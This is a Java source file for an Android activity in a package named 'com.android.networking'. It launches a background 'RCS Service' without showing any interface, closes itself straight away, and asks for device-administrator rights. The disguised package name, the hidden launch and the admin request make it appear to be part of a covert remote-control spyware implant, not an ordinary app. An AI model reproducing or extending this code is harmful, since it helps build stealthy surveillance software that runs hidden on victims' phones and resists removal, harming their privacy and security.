package com.android.networking.gui;

import com.android.networking.Core;
import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.listener.AR;
import com.android.networking.util.Check;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

/*
 *  http://stackoverflow.com/questions/10909683/launch-android-application-without-main-activity-and-start-service-on-launching
 */
public class HGui extends Activity {
	private static final String TAG = "HGui";
	private static final int ACTIVATION_REQUEST = 1;

	@Override
	public void onCreate(final Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		startService();
		finish();
	}

	public static void removeAdmin(Context context) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (removeAdmin) ");
		}
		ComponentName devAdminReceiver = new ComponentName(context, AR.class);
		DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
		dpm.removeActiveAdmin(devAdminReceiver);
	}
	
	public void addAdmin() {
		Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
		ComponentName deviceAdminComponentName = new ComponentName(this, AR.class);
		intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponentName);
		startActivityForResult(intent, ACTIVATION_REQUEST);
	}

	private void startService() {
		final String service = "com.android.networking.app"; //$NON-NLS-1$
		// final String service = "android.intent.action.MAIN";

		try {
			if (Core.isServiceRunning() == false) {
				final ComponentName cn = startService(new Intent(service));

				if (cn == null) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " RCS Service not started, null cn ");//$NON-NLS-1$
					}
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " RCS Service Name: " + cn.flattenToShortString());//$NON-NLS-1$
					}
				}
				addAdmin();
				
			}
		} catch (final SecurityException se) {
			if (Cfg.EXCEPTION) {
				Check.log(se);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " SecurityException caught on startService()");//$NON-NLS-1$
			}
		}
	}
}
